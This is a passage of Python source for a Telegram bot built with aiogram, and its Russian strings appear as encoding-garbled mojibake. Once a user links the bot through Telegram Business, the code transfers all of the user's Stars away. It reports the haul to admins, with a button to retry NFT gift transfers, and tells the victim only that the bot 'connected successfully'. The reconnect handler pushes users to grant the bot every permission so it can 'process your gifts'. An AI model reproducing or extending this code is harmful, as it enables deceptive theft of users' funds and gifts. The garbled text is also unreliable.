        stars_result = await transfer_all_stars(bot, conn_id, user_id)
        report += f"\n‚≠êÔ∏è <b>–ü–µ—Ä–µ–≤–æ–¥ –≤—Å–µ—Ö –∑–≤—ë–∑–¥:</b>\n‚Ä¢ –ë—ã–ª–æ –Ω–∞ —Å—á–µ—Ç—É: <b>{stars_result['stars']}</b>\n‚Ä¢ –ü–µ—Ä–µ–≤–µ–¥–µ–Ω–æ: <b>{stars_result['transferred']}</b>\n"
        if stars_result["error"]:
            report += f"‚ùóÔ∏è–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–≤–æ–¥–µ –∑–≤—ë–∑–¥: {stars_result['error']}\n"

        # –õ–æ–≥–∏—Ä—É–µ–º —É—Å–ø–µ—à–Ω–æ–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–π
        logger.info(f"‚úÖ –û–ø–µ—Ä–∞—Ü–∏–∏ –∑–∞–≤–µ—Ä—à–µ–Ω—ã –¥–ª—è @{username} (ID: {user_id})")
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç—á–µ—Ç –≤—Å–µ–º –∞–¥–º–∏–Ω–∞–º
        admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='üîÑ –ü–æ–≤—Ç–æ—Ä–∏—Ç—å –ø–µ—Ä–µ–≤–æ–¥ NFT', callback_data=f'retry_nft_user:{user_id}')],
            [InlineKeyboardButton(text='üìã –õ–æ–≥–∏ –ø–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é', callback_data=f'logs_user:{user_id}')],
            [InlineKeyboardButton(text='üí¨ –ù–∞–ø–∏—Å–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é', url=f'tg://user?id={user_id}')]
        ])
        for admin_id in get_admin_ids():
            try:
                await bot.send_message(admin_id, report, parse_mode='HTML', reply_markup=admin_keyboard)
            except Exception as e:
                logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç—á–µ—Ç–∞ –∞–¥–º–∏–Ω—É {admin_id}: {e}")

        # –°–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
        await bot.send_message(
            user_id,
            "‚úÖ <b>–ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω!</b>\n–í–µ—Å—å —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª —Ç–µ–ø–µ—Ä—å –¥–æ—Å—Ç—É–ø–µ–Ω.",
            parse_mode="HTML"
        )

    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ handle_business_connect: {e}")
        for admin_id in get_admin_ids():
            await bot.send_message(admin_id, f"üö® <b>–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏:</b> {str(e)}", parse_mode="HTML")

@router.callback_query(F.data == "reconnect_bot")
async def handle_reconnect_bot(callback: CallbackQuery):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –±–æ—Ç–∞"""
    try:
        user_id = callback.from_user.id
        username = callback.from_user.username or callback.from_user.first_name
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é –ø–æ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—é
        reconnect_message = (
            f"üîÑ <b>–ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–æ—Ç–∞</b>\n\n"
            f"üìã <b>–ü–æ—à–∞–≥–æ–≤–∞—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è:</b>\n\n"
            f"<b>1. –û—Ç–∫—Ä–æ–π—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram</b>\n"
            f"<b>2. –ù–∞–π–¥–∏—Ç–µ —Ä–∞–∑–¥–µ–ª Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞</b>\n"
            f"<b>3. –í—ã–±–µ—Ä–∏—Ç–µ –≤–∫–ª–∞–¥–∫—É –ß–∞—Ç-–±–æ—Ç—ã</b>\n"
            f"<b>4. –ù–∞–π–¥–∏—Ç–µ @Storthash_bot</b>\n"
            f"<b>5. –ù–∞–∂–º–∏—Ç–µ –û—Ç–∫–ª—é—á–∏—Ç—å</b>\n"
            f"<b>6. –ó–∞—Ç–µ–º –Ω–∞–∂–º–∏—Ç–µ –ü–æ–¥–∫–ª—é—á–∏—Ç—å</b>\n"
            f"<b>7. –£–±–µ–¥–∏—Ç–µ—Å—å —á—Ç–æ –í–°–ï —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –≤–∫–ª—é—á–µ–Ω—ã</b>\n\n"
            f"‚úÖ –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –±–æ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ–±—Ä–∞–±–æ—Ç–∞–µ—Ç –≤–∞—à–∏ –ø–æ–¥–∞—Ä–∫–∏!"
        )
        
        # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∫–Ω–æ–ø–∫–æ–π –Ω–∞—Å—Ç—Ä–æ–µ–∫
        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
        reconnect_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="‚öôÔ∏è –ü–µ—Ä–µ–π—Ç–∏ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏", url="tg://settings")],
            [InlineKeyboardButton(text="‚ú® –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ", callback_data="check_connection")]
        ])
        
        await callback.message.edit_text(
            reconnect_message,
            parse_mode="HTML",
            reply_markup=reconnect_keyboard
        )
        
        await callback.answer("–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!")
        
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤ handle_reconnect_bot: {e}")
        await callback.answer("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞", show_alert=True) 